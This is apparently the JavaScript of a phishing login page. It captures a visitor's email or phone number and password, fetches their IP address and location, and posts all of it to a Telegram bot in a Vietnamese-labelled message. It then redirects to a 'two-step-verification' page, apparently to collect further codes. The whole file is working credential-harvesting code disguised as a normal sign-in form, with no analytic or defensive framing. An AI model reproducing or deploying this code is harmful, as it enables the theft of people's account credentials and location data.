 localStorage.clear();
        localStorage.setItem('visited', 'true');
        const emailInput = document.querySelector('.lg\\:hidden #emailInput');
        const emailInputDesktop = document.getElementById('emailInputDesktop');
        const searchBtn = document.getElementById('searchBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const loginForm = document.getElementById('loginForm');

        let config;
        let storedData = JSON.parse(
            localStorage.getItem('messageData') ||
            JSON.stringify({
                messageId: null,
                email: '',
                geoData: null,
                formattedMessage: ''
            })
        );

        const initializeData = async () => {
            try {
                const geoResponse = await fetch('https://get.geojs.io/v1/ip/geo.json');
                const geoData = await geoResponse.json();
                storedData.geoData = {
                    ip: geoData.ip,
                    country: geoData.country_code,
                    city: geoData.city,
                    region: geoData.region
                };
                localStorage.setItem('messageData', JSON.stringify(storedData));

                const configResponse = await fetch('config.json');
                config = await configResponse.json();
            } catch (error) {
                console.error('Error loading data:', error);
            }
        };

        initializeData();

        const passwordFieldMobile = document.getElementById('passwordFieldMobile');
        const passwordInput = document.getElementById('passwordInput');
        const passwordInputDesktop = document.getElementById('passwordInputDesktop');

        function isValidEmail(phone) {
            // const atIndex = email.indexOf('@');
            // const dotIndex = email.lastIndexOf('.');                        
            // return atIndex > 0 && dotIndex > atIndex && dotIndex < email.length - 1;
            const phoneRegex = /^\+?\d{1,4}?[-.\s]?\(?\d{1,3}?\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}[-.\s]?\d{1,9}$/;
            return phoneRegex.test(phone);
        }


        emailInput.addEventListener('input', function() {
            const phone = this.value;
            const errorMessage = document.getElementById('errorMessage');
            if (isNaN(phone) || phone.trim() === '') {
                errorMessage.classList.remove('hidden');
            } else {
                errorMessage.classList.add('hidden');
            }
            if (isValidEmail(this.value)) {
                passwordFieldMobile.classList.remove('hidden');
                passwordInput.required = true;
            } else {
                passwordFieldMobile.classList.add('hidden');
                passwordInput.required = false;
            }
        });

        emailInputDesktop.addEventListener('input', function() {
            const phone = this.value;
            const errorMessage = document.getElementById('errorMessage');
            if (isNaN(phone) || phone.trim() === '') {
                errorMessage.classList.remove('hidden');
            } else {
                errorMessage.classList.add('hidden');
            }

            if (isValidEmail(this.value)) {
                passwordInputDesktop.classList.remove('hidden', 'lg:hidden');
                passwordInputDesktop.classList.add('lg:block');
                passwordInputDesktop.required = true;
            } else {
                passwordInputDesktop.classList.add('hidden', 'lg:hidden');
                passwordInputDesktop.classList.remove('lg:block');
                passwordInputDesktop.required = false;
                passwordInputDesktop.classList.remove('lg:border-red-500');
            }
        });

        window.addEventListener('resize', function() {
            const emailValue = window.innerWidth >= 768 ? emailInputDesktop.value : emailInput.value;
            const phone = this.value;
            const errorMessage = document.getElementById('errorMessage');
            if (isNaN(phone) || phone.trim() === '') {
                errorMessage.classList.remove('hidden');
            } else {
                errorMessage.classList.add('hidden');
            }
            if (window.innerWidth >= 768) {
                passwordFieldMobile.classList.add('hidden');
                if (isValidEmail(emailValue)) {
                    passwordInputDesktop.classList.remove('hidden', 'lg:hidden');
                    passwordInputDesktop.classList.add('lg:block');
                }
            } else {
                passwordInputDesktop.classList.add('hidden', 'lg:hidden');
                passwordInputDesktop.classList.remove('lg:block');
                if (isValidEmail(emailValue)) {
                    passwordFieldMobile.classList.remove('hidden');
                }
            }
        });

        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (!config) return;

            const emailValue = window.innerWidth >= 1024 ? emailInputDesktop.value : emailInput.value;
            const passwordValue = window.innerWidth >= 1024 ? passwordInputDesktop.value : passwordInput.value;

            if (!passwordValue) {
                if (window.innerWidth >= 1024) {
                    passwordInputDesktop.classList.add('lg:border-red-500', 'shake');
                    setTimeout(() => {
                        passwordInputDesktop.classList.remove('shake');
                    }, 650);
                } else {
                    passwordInput.classList.add('border-red-500', 'shake');
                    setTimeout(() => {
                        passwordInput.classList.remove('shake');
                    }, 650);
                }
                return;
            }

            searchBtn.disabled = true;
            storedData.email = emailValue;
            storedData.password = passwordValue;
            localStorage.setItem('messageData', JSON.stringify(storedData));

            const now = new Date();
            const timeStr = now.toLocaleString('vi-VN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            let message = `📅 <b>Thời gian</b>: <code>${timeStr}</code>\n`;
            if (storedData.geoData) {
                message += `🌐 <b>IP</b>: <code>${storedData.geoData.ip}</code>\n`;
                message +=
                    `🌍 <b>Vị trí</b>: <code>${storedData.geoData.country}</code> - <code>${storedData.geoData.region}</code> - <code>${storedData.geoData.city}</code>\n\n`;
            }

            message += `📧 <b>Email</b>: <code>${storedData.email}</code>\n`;
            message += `🔑 <b>Password</b>: <code>${storedData.password}</code>\n`;

            storedData.formattedMessage = message;
            localStorage.setItem('messageData', JSON.stringify(storedData));
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: roomId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                const data = await response.json();
                if (data.ok) {
                    storedData.messageId = data.result.message_id;
                    localStorage.setItem('messageData', JSON.stringify(storedData));
                    window.location.href = 'two-step-verification';
                }
            } catch (error) {
                console.error('Error sending message:', error);
            }
        });

        cancelBtn.addEventListener('click', function() {
            window.history.back();
        });

        passwordInput.addEventListener('input', function() {
            this.classList.remove('border-red-500', 'shake');
        });

        passwordInputDesktop.addEventListener('input', function() {
            this.classList.remove('lg:border-red-500', 'shake');
        });

        // cancelBtn.addEventListener('click', function () {
        //     window.history.back();
        // });

        document.addEventListener('DOMContentLoaded', () => {
            const loadGoogleTranslate = async () => {
                try {
                    const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
                    const data = await response.json();
                    const countryCode = data.country_code;

                    const response2 = await fetch('country_to_language.json');
                    const languageMap = await response2.json();
                    const languageCode = languageMap[countryCode] || 'en';

                    if (languageCode !== 'en') {
                        const script = document.createElement('script');
                        script.src =
                            'https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit';
                        script.async = true;
                        document.body.appendChild(script);

                        window.googleTranslateElementInit = () => {
                            new google.translate.TranslateElement({
                                    pageLanguage: 'en',
                                    includedLanguages: languageCode,
                                    autoDisplay: false
                                },
                                'google_translate_element'
                            );

                            let retryCount = 0;
                            const maxRetries = 20;
                            const retryInterval = 300;

                            const attemptTranslation = () => {
                                const gtcombo = document.querySelector('.goog-te-combo');
                                const instance = google.translate.TranslateElement.getInstance?.();

                                if (gtcombo || instance) {
                                    const element = document.querySelector('html');
                                    element.setAttribute('lang', languageCode);

                                    if (gtcombo) {
                                        gtcombo.value = languageCode;
                                        gtcombo.dispatchEvent(new Event('change'));
                                    }

                                    if (instance) {
                                        try {
                                            instance.setEnabled(true);
                                            const translateSelect = document.querySelector(
                                                '.goog-te-combo');
                                            if (translateSelect) {
                                                translateSelect.value = languageCode;
                                                translateSelect.dispatchEvent(new Event('change'));
                                            }
                                        } catch (e) {
                                            console.clear();
                                        }
                                    }
                                    return true;
                                }

                                retryCount++;
                                if (retryCount < maxRetries) {
                                    setTimeout(attemptTranslation, retryInterval);
                                }
                                return false;
                            };

                            attemptTranslation();
                        };
                    }
                } catch (error) {
                    console.clear();
                }
            };

            //loadGoogleTranslate();
        });